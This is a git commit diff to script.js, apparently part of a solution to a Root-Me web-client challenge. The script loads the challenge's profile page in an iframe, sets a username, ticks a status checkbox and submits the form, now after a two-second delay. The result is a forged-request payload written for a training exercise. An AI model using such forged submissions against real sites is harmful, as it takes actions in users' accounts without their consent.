9d248d135dbbba2a276bc81728767cbfb13d77a5
fullgitstack <mackormack0@gmail.com>
2025-10-10 18:21:32 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,10 +1,12 @@
 const ifr = document.querySelector("#principalIframe");
 ifr.src = "http://challenge01.root-me.org/web-client/ch23/index.php?action=profile"
 
+setTimeout((element) => {
 ifr.contentDocument.querySelector("#username").value = "test1"
 ifr.contentDocument.querySelector("#status").checked = true
 
 ifr.contentDocument.forms[0].submit()
+}, 2000)
 
 
 
